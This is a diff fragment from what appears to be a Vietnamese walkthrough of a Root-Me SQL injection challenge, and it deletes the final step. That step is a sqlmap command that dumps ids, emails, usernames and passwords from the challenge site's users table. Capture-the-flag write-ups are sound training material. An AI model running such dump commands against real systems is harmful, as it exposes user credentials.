@@ -42,6 +42,6 @@ Ra kết quả có tables `users`. Tiếp tục vào table `users`
 
 Bước cuối chỉ cần lấy data các column nữa là xong
 
-`python3 sqlmap -u "http://challenge01.root-me.org/web-serveur/ch40/?action=member&member=1" --time-sec=10 -D public -T users -C id,email,usermame,password --dump`
+
 
 
